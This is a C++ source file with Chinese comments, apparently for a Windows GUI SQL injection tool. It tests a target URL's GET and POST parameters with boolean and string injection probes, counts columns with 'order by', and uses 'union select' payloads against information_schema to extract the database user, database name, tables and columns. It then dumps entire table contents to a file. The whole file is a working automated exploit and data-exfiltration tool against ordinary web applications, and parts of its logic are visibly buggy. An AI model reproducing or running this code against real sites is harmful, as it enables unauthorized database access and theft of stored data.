#include "Injectior.h"
#include<vector>
#include <string>
#include "stdafx.h"
#include <stdlib.h>
using namespace std;
void Injector::SeparatePara()
{
	//http://
	int iHttpLength = 0;
	int iFirstSlash = 0;
	if((iHttpLength = strnlen_s("http://", 1024))!=-1)
		iFirstSlash = m_Url.find('/', iHttpLength);
	else if ((iHttpLength = strnlen_s("https://", 1024))!=-1)
		iFirstSlash = m_Url.find('/', iHttpLength);
	else
		iHttpLength = 0;
	
	m_Domain = m_Url.substr(iHttpLength, iFirstSlash - iHttpLength);
	if (m_Url.find('?',iFirstSlash)==-1)
		m_Page =m_Url.substr(iFirstSlash, m_Url.length()-iFirstSlash);
	else
		m_Page = m_Url.substr(iFirstSlash, m_Url.find('?',iFirstSlash)-iFirstSlash);//需要‘？’
	if (m_InjectClass & GETMASK)
	{//从url中分离GET参数
		string AllPara = m_Url.substr(m_Url.find('?',0)+1, m_Url.length()-m_Url.find('?',0)-1);
		string temp;
		for (string::iterator itr=AllPara.begin(); itr!=AllPara.end(); ++itr){
			if (*itr!='&'){
				temp += *itr;
			}
			else
			{
				m_GetPara.push_back(temp);
				temp.clear();
			}
		}
		m_GetPara.push_back(temp);
		temp.clear();	
	}
	if (m_InjectClass & POSTMASK)
	{
		string AllPara = m_csql_injectordlg->m_stringRawPost;
		string temp;
		for (string::iterator itr=AllPara.begin(); itr!=AllPara.end(); ++itr){
			if (*itr!='&'){
				temp += *itr;
			}
			else
			{
				m_PostPara.push_back(temp);
				temp.clear();
			}
		}
		m_PostPara.push_back(temp);
		temp.clear();
	}
	if (m_InjectClass & COOKIEMASK)
	{
		/*string AllPara = m_csql_injectordlg->m_stringRawCookie;
		string temp;
		for (string::iterator itr=AllPara.begin(); itr!=AllPara.end(); ++itr){
			if (*itr!='&'){
				temp += *itr;
			}
			else
			{
				m_CookiePara.push_back(temp);
				temp.clear();
			}
		}*/
		return;
	}
	return;
}
bool Injector::BooleanInjectTesting(int HTTPMethod)//
{//TODO:未包括POST
	string allPara;//保存全部参数
	string normalPara;//正常的参数
	string testingPara;//测试的参数
	string comparestring;
	comparestring= m_csql_injectordlg->m_CompareString;
	if (HTTPMethod &GETMASK){
		for (vector<string>::iterator i=m_GetPara.begin(); i!=m_GetPara.end(); ++i)
		{//需要测试的某个参数i
			//首先清除上次测试留下的数据
			allPara.clear();
			normalPara.clear();
			testingPara.clear();
			for (vector<string>::iterator j=m_GetPara.begin(); j!=m_GetPara.end(); ++j)
			{//将所有参数提取出来并连接，除了测试参数
				if (i!=j)
				{
					allPara += *j;
					allPara += '&';
				}
			}
			allPara = m_Page +"?"  + *i;
			normalPara = allPara+ "aNd 1=1";
			testingPara = allPara + " aNd 1=2"; 	
			HTTPRequest *normalRequest = new HTTPRequest(m_Domain, allPara, HTTPMethod);
			HTTPRequest *testingRequest = new HTTPRequest(m_Domain, testingPara, HTTPMethod);
			string normalContent = normalRequest->GetContent();
			if (normalContent.find(comparestring, 0) == -1)
			{//正常的访问出错
				delete normalRequest;
				delete testingRequest;
				continue;
			}
			string testingContent = testingRequest->GetContent();
			if (testingContent.find(comparestring, 0) == -1)
			{
				//有注入漏洞，记录有漏洞的参数
				m_VulnerabilityClass = BOOLEANINJECT;
				delete normalRequest;
				delete testingRequest;
				m_VulnerablePara = *i;
				//这个变量保存无漏洞的参数，删除掉有漏洞的参数
				m_GetPara.erase(i);
				return true;

			}
			//end loop
		}
	}
	else if(HTTPMethod & POSTMASK)//Post注入
	{

		for (vector<string>::iterator i=m_PostPara.begin(); i!=m_PostPara.end(); ++i)
		{//需要测试的某个参数i
			//首先清除上次测试留下的数据
			allPara.clear();
			normalPara.clear();
			testingPara.clear();
			for (vector<string>::iterator j=m_PostPara.begin(); j!=m_PostPara.end(); ++j)
			{//将所有参数提取出来并连接，除了测试参数
				if (i!=j)
				{
					allPara += *j;
					allPara += '&';
				}
			}
			allPara += *i;
			normalPara = allPara + " aNd 1=1";
			testingPara = allPara + " aNd 1=2";
			HTTPRequest *normalRequest = new HTTPRequest(m_Domain, m_Page, HTTPMethod);
			HTTPRequest *testingRequest = new HTTPRequest(m_Domain, m_Page, HTTPMethod);
			normalRequest->setPostDate(allPara);
			testingRequest->setPostDate(testingPara);
			string normalContent = normalRequest->GetContent();
			if (normalContent.find(comparestring, 0) == -1)
			{//正常的访问出错
				delete normalRequest;
				delete testingRequest;
				continue;
			}
			string testingContent = testingRequest->GetContent();
			if (testingContent.find(comparestring, 0) == -1)
			{
				//有注入漏洞,保存有漏洞的参数
				m_VulnerabilityClass = BOOLEANINJECT;
				delete normalRequest;
				delete testingRequest;
				m_VulnerablePara = *i;
				//这个变量保存无漏洞的参数，删除掉有漏洞的参数
				m_PostPara.erase(i);		
				return true;

			}//end loop

		}
	}
	else{//未知的http请求方式
		return false;
	}
	return false;
}
bool Injector::StringInjectTesting(int HTTPMethod)//字符串注入
{
	string allPara;//保存全部参数
	string normalPara;//正常的参数
	string testingPara;//测试的参数
	string comparestring;
	comparestring= m_csql_injectordlg->m_CompareString;
	if (HTTPMethod &GETMASK){
		for (vector<string>::iterator i=m_GetPara.begin(); i!=m_GetPara.end(); ++i)
		{//需要测试的某个参数i
			//首先清除上次测试留下的数据
			allPara.clear();
			normalPara.clear();
			testingPara.clear();
			for (vector<string>::iterator j=m_GetPara.begin(); j!=m_GetPara.end(); ++j)
			{//将所有参数提取出来并连接，除了测试参数
				if (i!=j)
				{
					allPara += *j;
					allPara += '&';
				}
			}
			allPara = m_Page +"?"  + *i;
			normalPara = allPara+ "aNd '1'='1";
			testingPara = allPara + " aNd '1'='2"; 	
			HTTPRequest *normalRequest = new HTTPRequest(m_Domain, allPara, HTTPMethod);
			HTTPRequest *testingRequest = new HTTPRequest(m_Domain, testingPara, HTTPMethod);
			string normalContent = normalRequest->GetContent();
			if (normalContent.find(comparestring, 0) == -1)
			{//正常的访问出错
				delete normalRequest;
				delete testingRequest;
				continue;
			}
			string testingContent = testingRequest->GetContent();
			if (testingContent.find(comparestring, 0) == -1)
			{
				//有注入漏洞
				
				m_VulnerabilityClass = STRINGINJECT;
				return true;
			}
			//end loop
		}
	}
	else if(HTTPMethod &POSTMASK)//Post注入
	{

		for (vector<string>::iterator i=m_PostPara.begin(); i!=m_PostPara.end(); ++i)
		{//需要测试的某个参数i
			//首先清除上次测试留下的数据
			allPara.clear();
			normalPara.clear();
			testingPara.clear();
			for (vector<string>::iterator j=m_PostPara.begin(); j!=m_PostPara.end(); ++j)
			{//将所有参数提取出来并连接，除了测试参数
				if (i!=j)
				{
					allPara += *j;
					allPara += '&';
				}
			}
			allPara += *i;
			normalPara = allPara + "aNd '1'='1";
			testingPara = allPara + "aNd '1'='2";
			HTTPRequest *normalRequest = new HTTPRequest(m_Domain, m_Page, HTTPMethod);
			HTTPRequest *testingRequest = new HTTPRequest(m_Domain, m_Page, HTTPMethod);
			normalRequest->setPostDate(allPara);
			testingRequest->setPostDate(testingPara);
			string normalContent = normalRequest->GetContent();
			if (normalContent.find(comparestring, 0) == -1)
			{//正常的访问出错
				delete normalRequest;
				delete testingRequest;
				continue;
			}
			string testingContent = testingRequest->GetContent();
			if (testingContent.find(comparestring, 0) == -1)
			{
				//有注入漏洞
				m_VulnerabilityClass = STRINGINJECT;
				return true;

			}//end loop

		}
	}
	else{//未知的http请求方式
		return false;
	}
	return false;
}
void Injector::TryInject()
{//尝试各种可能的注入，如果成功则调用Inject。

	SeparatePara();
	if (m_InjectClass & GETMASK)
	{

		InjectClass injectclass=GET;
		if (BooleanInjectTesting(injectclass)==true){
			::MessageBox(m_csql_injectordlg->m_hWnd, _T("Get Inject"), _T("f"), NULL);
			FirstStepInject();
		}
		if (StringInjectTesting(injectclass)==true)
			//Inject();
			;
	}
	else if (m_InjectClass & POSTMASK)
	{
		InjectClass injectclass=POST;
		if (BooleanInjectTesting(injectclass)==true){
			::MessageBox(m_csql_injectordlg->m_hWnd, _T("Get Inject"), _T("f"), NULL);
			FirstStepInject();
		}
		if (StringInjectTesting(injectclass)==true)
			//Inject();
			;
	}
	else if(m_InjectClass & COOKIEMASK)
	{
		return;
	}
}
int Injector::GetColumnNumber()
{
	int iColumn=0;
	char cZero = '0';
	if (m_InjectClass & GETMASK)
	{
		string Page = m_Page + " order by ";
		int i=1;
		for (; i<99; i++){
			string testingPage = Page + (char)(cZero+i);
			HTTPRequest *h = new HTTPRequest(m_Domain, testingPage, m_InjectClass & GETMASK);
			string Result = h->GetContent();
			if (Result.find(m_csql_injectordlg->m_CompareString, 0) != -1){//order by Success
				delete h;
				continue;
			}
			else //order by fail{
			{
				delete h;
				break;
			}
		}//end for
		
		iColumn = i-1;
		return iColumn;
	}
	else if (m_InjectClass & POSTMASK)
	{
		string Post ;//= m_PostPara;
		for (vector<string>::iterator i=m_PostPara.begin(); i!=m_PostPara.end(); ++i)
		{
			Post += *i;
		}
		Post +=  " & ";
		Post += m_VulnerablePara;
		Post = Post + " order by ";
		int i=1;
		for (; i<99; i++)
		{
			string testingPost = Post + (char)(cZero+i);
			HTTPRequest *h = new HTTPRequest(m_Domain, m_Page, m_InjectClass & POSTMASK);
			h->setPostDate(testingPost);
			string content = h->GetContent();
			if (content.find(m_csql_injectordlg->m_CompareString, 0) != -1)
			{//正常页面
				delete h;
				continue;
			}
			else
			{//返回出错页面
				break;
			}
		}//end for
		iColumn = i-1;
		return iColumn;
	}
	else
	{
		return -1;
	}
	return -1;
}
bool Injector::GetInjectionKeyWord(string &ResultString)
{
	char cZero='0';
	int iKeyWordLength = m_iKeyWordLength;
	if (m_InjectClass & GETMASK)
	{
		string Page=m_Page;
		string testingPage = Page;
		for (vector<string>::iterator i = m_GetPara.begin(); i!=m_GetPara.end(); ++i)
		{
			testingPage += *i;
			testingPage += '&';
		}
		testingPage += m_VulnerablePara;
		testingPage +=" and 1=2 union select ";
		int i=1;
		for (; i<m_iColumn; i++)
		{
			testingPage += (char)(cZero+i);
			testingPage += ',';
		}//end for
		testingPage += (char)(cZero+i);
		HTTPRequest *h = new HTTPRequest(m_Domain, testingPage, m_InjectClass & GETMASK);
		string Content = h->GetContent();
		delete h;
		char testingNum = (char)(cZero+i);
		int KeyWordOffset = 0;
		if ((KeyWordOffset = Content.find(&testingNum, 0)) == -1)
			return false;
		ResultString = Content.substr(KeyWordOffset-iKeyWordLength, iKeyWordLength-1);//-1为了删除最后那个数字
		m_InjectionKeyWordEnd = Content.substr(KeyWordOffset+1, KeyWordOffset+1+iKeyWordLength);//+1为了跳过数字
		
		return true;
	}
	else if (m_InjectClass & POSTMASK)
	{
		const int iCompareNumber = 9;//
		string testingPost;
		for (vector<string>::iterator i=m_PostPara.begin(); i!= m_PostPara.end(); ++i)
		{
			testingPost += *i;
			testingPost += '&';
		}
		testingPost += m_VulnerablePara;
		testingPost += " and 1=2 union select ";
		int i=1;
		for (; i<=m_iColumn-1; i++)
		{
			testingPost += (char)(cZero+i);
			testingPost += ',';
		}
		testingPost += (char)(cZero+iCompareNumber);
		HTTPRequest *h = new HTTPRequest(m_Domain, m_Page, m_InjectClass & POSTMASK);
		h->setPostDate(testingPost);
		int KeyWordOffset = 0;
		char testingNum = (char)(cZero+iCompareNumber);
		string content = h->GetContent();
		if ((KeyWordOffset = content.find(testingNum, 0)) ==-1)
		{//fail
			delete h;
			return false;
		}
		//9会出现两次，后面那次才是需要的。
		if ((KeyWordOffset = content.find(testingNum, KeyWordOffset+1)) ==-1)
		{//fail
			delete h;
			return false;
		}
		ResultString = content.substr(KeyWordOffset-iKeyWordLength, iKeyWordLength-1);//-1为了删除最后那个数字
		m_InjectionKeyWordEnd = content.substr(KeyWordOffset+1, KeyWordOffset+1+iKeyWordLength);//+1为了跳过数字
		delete h;
		return true;
	}
	else
		return false;
}
bool Injector::GetUser()
{
	char cZero='0';
	if (m_InjectionKeyWord.length()==0)
		return false;
	if (m_InjectClass&GETMASK){
		string Page=m_Page;
		string testingPage = Page;
		for (vector<string>::iterator i = m_GetPara.begin(); i!=m_GetPara.end(); ++i)
		{
			testingPage += *i;
			testingPage += '&';
		}
		testingPage += m_VulnerablePara;
		testingPage +=" and 1=2 union select ";
		int i=1;
		for (; i<m_iColumn; i++)
		{
			testingPage += (char)(cZero+i);
			testingPage += ',';
		}//end for
		testingPage += "user();%23";
		HTTPRequest *h = new HTTPRequest (m_Domain, testingPage, m_InjectClass&GETMASK);
		string content = h->GetContent();
		int BeginOffset;
		int EndOffset;
		int DataLength;
		if ((BeginOffset = content.find(m_InjectionKeyWord, 0)) == -1)
		{
			delete h;
			return false;
		}
		BeginOffset += m_iKeyWordLength;
		if ((EndOffset = content.find(m_InjectionKeyWordEnd, BeginOffset)) == -1)
		{
			delete h;
			return false;
		}
		DataLength = EndOffset - BeginOffset;
		m_csql_injectordlg->m_csDBUser.SetWindowText(m_UserName.c_str());
		m_UserName = content.substr(BeginOffset, DataLength);
		m_csql_injectordlg->m_csDBUser.SetWindowText(m_UserName.c_str());
		delete h;
		return true;
	}
	else if (m_InjectClass & POSTMASK)
	{
		string testingPost;
		for (vector<string>::iterator i=m_PostPara.begin(); i!= m_PostPara.end(); ++i)
		{
			testingPost += *i;
			testingPost += '&';
		}
		testingPost += m_VulnerablePara;
		testingPost += " and 1=2 union select ";
		int i=1;
		for (; i<m_iColumn; i++)
		{
			testingPost += (char)(cZero+i);
			testingPost += ',';
		}
		testingPost += "user()";
		HTTPRequest *h = new HTTPRequest(m_Domain, m_Page, m_InjectClass & POSTMASK);
		h->setPostDate(testingPost);
		string content = h->GetContent();
		int BeginOffset;
		int EndOffset;
		int DataLength;
		if ((BeginOffset = content.find(m_InjectionKeyWord, 0)) == -1)
			return false;
		BeginOffset += m_iKeyWordLength;
		if ((EndOffset = content.find(m_InjectionKeyWordEnd, BeginOffset)) == -1)
			return false;
		DataLength = EndOffset - BeginOffset;
		m_UserName = content.substr(BeginOffset, DataLength);
		m_csql_injectordlg->m_csDBUser.SetWindowText(m_UserName.c_str());
		return true;
	}
	else
	{
		return false;
	}
}
bool Injector::GetInjectionValue(string &ResultString,string &InjectString)
{/*第一次参数是结果，第二个参数是攻击负荷。传出结果是攻击负荷返回的数据*/
	int cZero = '0';
	if (m_InjectionKeyWord.length()==0)
		return false;
	if (m_InjectClass&GETMASK){
		string Page=m_Page;
		string testingPage = Page;
		for (vector<string>::iterator i = m_GetPara.begin(); i!=m_GetPara.end(); ++i)
		{
			testingPage += *i;
			testingPage += '&';
		}
		testingPage += m_VulnerablePara;
		testingPage +=" and 1=2 union select ";
		int i=1;
		for (; i<m_iColumn; i++)
		{
			testingPage += (char)(cZero+i);
			testingPage += ',';
		}//end for
		testingPage += InjectString;
		testingPage += ";%23";
		HTTPRequest *h = new HTTPRequest (m_Domain, testingPage, m_InjectClass&GETMASK);
		string content = h->GetContent();
		int BeginOffset;
		int EndOffset;
		int DataLength;
		if ((BeginOffset = content.find(m_InjectionKeyWord, 0)) == -1){
			delete h; 
			return false;
		}
		BeginOffset += m_iKeyWordLength;
		if ((EndOffset = content.find(m_InjectionKeyWordEnd, BeginOffset)) == -1){
			delete h; 
			return false;
		}
		DataLength = EndOffset - BeginOffset;
		m_csql_injectordlg->m_csDBUser.SetWindowText(m_UserName.c_str());
		ResultString = content.substr(BeginOffset, DataLength);
		delete h; 
		return true;
	}
	else if (m_InjectClass & POSTMASK)
	{
		string testingPost;
		for (vector<string>::iterator i=m_PostPara.begin(); i!= m_PostPara.end(); ++i)
		{
			testingPost += *i;
			testingPost += '&';
		}
		testingPost += m_VulnerablePara;
		testingPost += " and 1=2 union select ";
		int i=1;
		for (; i<m_iColumn; i++)
		{
			testingPost += (char)(cZero+i);
			testingPost += ',';
		}
		testingPost += InjectString;
		
		HTTPRequest *h = new HTTPRequest(m_Domain, m_Page, m_InjectClass & POSTMASK);
		h->setPostDate(testingPost);
		string content = h->GetContent();
		int BeginOffset;
		int EndOffset;
		int DataLength;
		if ((BeginOffset = content.find(m_InjectionKeyWord, 0)) == -1)
			return false;
		BeginOffset += m_iKeyWordLength;
		if ((EndOffset = content.find(m_InjectionKeyWordEnd, BeginOffset)) == -1)
			return false;
		DataLength = EndOffset - BeginOffset;
		ResultString = content.substr(BeginOffset, DataLength);
		delete h;
		return true;
	}
	else
	{
		return false;
	}
}
bool Injector::GetDatabaseName()
{
	string InjectString = "database();";
	GetInjectionValue(m_DatabaseName, InjectString);
	if (m_DatabaseName.length()==0)
		return false;
	m_csql_injectordlg->m_csDBName.SetWindowText(m_DatabaseName.c_str());
	return true;
}
bool Injector::GetTableName()//获得表明,保存在m_vecTable中,并写入界面
{
	char cZero= '0';
	string halfAttackString = "table_name from information_schema.tables where table_schema='" + m_DatabaseName +"' limit ";/*缺少limit 1，1*/
	int iLimit = 1;
	char limitNum[3]={0};
	_itoa_s(iLimit,limitNum,3, 10);
	while (true){
		_itoa_s(iLimit,limitNum,3, 10);
		string AttackString = halfAttackString + limitNum;
		AttackString+=',';
		AttackString+=limitNum;
		iLimit++;
		string TableName;
		if (GetInjectionValue(TableName, AttackString))
		{
			m_vecTable.push_back(TableName);
		}
		else
		{
			break;
		}
	}
	for (vector<string>::iterator i=m_vecTable.begin(); i!=m_vecTable.end(); ++i)
	{
		m_csql_injectordlg->m_listboxTable.AddString(i->c_str());
	}
	m_csql_injectordlg->m_btnExportTable.EnableWindow(true);
	return true;
	
}
bool Injector::FirstStepInject()
{
	m_iColumn = GetColumnNumber();
	GetInjectionKeyWord(m_InjectionKeyWord);
	GetUser();
	GetDatabaseName();
	GetTableName();
	return true;;
}
bool Injector::GetColumnName(string TableName)
{
	m_vecColumnName.clear();
	char cZero= '0';
	string halfAttackString ="column_name from information_schema.columns where table_name='"+TableName+"' limit ";//缺少limit
	int iLimit = 1;
	char limitNum[3]={0};
	
	while (true){
		_itoa_s(iLimit,limitNum,3, 10);
		string AttackString = halfAttackString + limitNum;
		AttackString+=',';
		AttackString+=limitNum;
		iLimit++;
		string ColumnName;
		if (GetInjectionValue(ColumnName, AttackString))
		{
			m_vecColumnName.push_back(ColumnName);
		}
		else
		{
			break;
		}
	}
	return true;
}
bool Injector::ExportTable(string TableName,string FileName)
{
	GetColumnName(TableName);
	FILE *fp = fopen(FileName.c_str(), "w+");
	int iLimit = 1;
	char LimitNum[3] = {0};
	string Space = " ";
	string LRLF = "\r\n";
	while (true){
		_itoa_s(iLimit, LimitNum, 10);
		for (vector<string>::iterator i =m_vecColumnName.begin(); i!=m_vecColumnName.end(); ++i){
			string AttackString =*i;
			string DataValue;
			AttackString +=" from ";
			AttackString +=TableName;
			AttackString += " limit ";
			AttackString += LimitNum;
			AttackString += ",";
			AttackString += LimitNum;
			if (GetInjectionValue(DataValue, AttackString))
			{
				fwrite(DataValue.c_str(), DataValue.length(), 1, fp);
				fwrite(Space.c_str(), Space.length(), 1, fp);
			}
			else
			{
				fwrite(LRLF.c_str(), LRLF.length(), 1, fp);
				if (i==m_vecColumnName.begin())
				{
					goto end;
				}
				break;
			}

		}
		iLimit++;
	}
end:
	return true;
}